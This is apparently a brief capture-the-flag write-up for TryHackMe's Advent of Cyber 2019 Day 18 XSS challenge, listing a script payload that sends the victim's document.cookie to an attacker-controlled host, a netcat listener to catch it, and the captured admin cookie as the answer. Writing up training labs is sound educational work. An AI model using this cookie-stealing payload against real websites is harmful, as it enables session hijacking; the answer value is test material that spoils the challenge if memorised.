---
title: "TryHackMe Advent of Cyber 2019 Day 18"
date: 2019-12-18
layout: post
platform: "TryHackMe"
writeup_type: "seasonal"
series: "Advent of Cyber 2019"
event_day: "Day 18"
permalink: "/writeups/advent-of-cyber/adventofcyber-2019-day-18/"
tags:
  - tryhackme
  - seasonal
  - advent-of-cyber-2019
  - day-18
---

# Christmas XSS

```text
<script>window.location='http://<kali-ip>/?cookie='+document.cookie</script>

nc -lvnp 80
-> got cookie
```

## Task

- What is the admin's authid cookie value?
```text
2564799a4e6689972f6d9e1c7b406f87065cbf65
```
